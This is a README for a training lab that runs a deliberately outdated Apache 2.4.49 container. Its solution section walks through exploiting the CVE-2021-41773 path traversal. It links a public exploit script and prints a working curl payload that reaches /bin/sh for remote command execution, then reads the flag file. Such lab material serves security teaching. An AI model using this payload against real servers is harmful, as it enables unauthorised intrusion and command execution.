# Apache RetroGame

## Description
RetroGame is a static, retro-themed website served by a deliberately outdated Apache container. It provides a contained lab for learning how server configuration and unpatched software can expose a web server.

## Vulnerability Focus
Apache HTTP Server 2.4.49 path traversal (CVE-2021-41773), with CGI enabled in the server configuration.

## Technology
Apache HTTP Server 2.4.49 and static HTML assets.

## Solution
1. Enumerate; fingerprint Apache **2.4.49** (Wappalyzer / response headers).
2. Use the CVE-2021-41773 exploit (e.g. https://github.com/thehackersbrain/CVE-2021-41773):
   ```bash
   python3 exploit.py -t retrogame.hacktraining.nl
   ```
3. With RCE, locate and read the flag:
   ```bash
   find / -name flag.txt ; cat /usr/local/apache2/htdocs/geheim/flag.txt
   ```

Raw payload equivalent (POST to `/bin/sh` through the traversal):
```bash
curl --path-as-is -X POST --data 'echo Content-Type: text/plain; echo; id' \
  'http://<host>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

## Run and Test
From this directory, start the local test environment:

```sh
docker compose -f test/docker-compose.yml up --build
```

Open <http://localhost> while the container is running. Stop it with:

```sh
docker compose -f test/docker-compose.yml down
```

## Defensive Takeaway
Keep server software patched and supported, and avoid enabling unnecessary server modules.
